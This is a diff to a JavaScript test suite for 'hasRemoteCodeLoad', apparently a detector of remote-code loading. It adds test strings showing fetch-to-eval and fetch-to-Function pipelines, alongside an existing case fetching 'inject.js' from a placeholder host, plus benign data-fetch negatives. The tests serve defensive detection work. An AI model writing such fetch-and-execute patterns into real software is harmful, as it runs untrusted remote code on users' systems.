@@ -86,10 +86,25 @@ describe('hasRemoteCodeLoad (pure remote-code detector)', () => {
     expect(hasRemoteCodeLoad("fetch('https://x.example/inject.js').then(r=>r.text())")).toBe(true)
   })
 
+  it('flags extensionless and runtime-built fetch-to-execution pipelines', () => {
+    expect(hasRemoteCodeLoad('fetch(url).then(r => r.text()).then(eval)')).toBe(true)
+    expect(
+      hasRemoteCodeLoad("fetch(base + '/loader').then(r => r.text()).then(source => eval(source))")
+    ).toBe(true)
+    expect(
+      hasRemoteCodeLoad('const source = await (await fetch(runtimeUrl)).text(); Function(source)()')
+    ).toBe(true)
+  })
+
   it('does NOT flag local code, bare-specifier imports, or plain data fetches', () => {
     expect(hasRemoteCodeLoad("console.log('hello')")).toBe(false)
     expect(hasRemoteCodeLoad("import _ from 'lodash'")).toBe(false)
     expect(hasRemoteCodeLoad("fetch('https://api.example/data.json')")).toBe(false)
+    expect(
+      hasRemoteCodeLoad(
+        "fetch('https://api.example/report').then(r => r.text()).then(text => render(text))"
+      )
+    ).toBe(false)
     expect(hasRemoteCodeLoad('')).toBe(false)
   })
 })
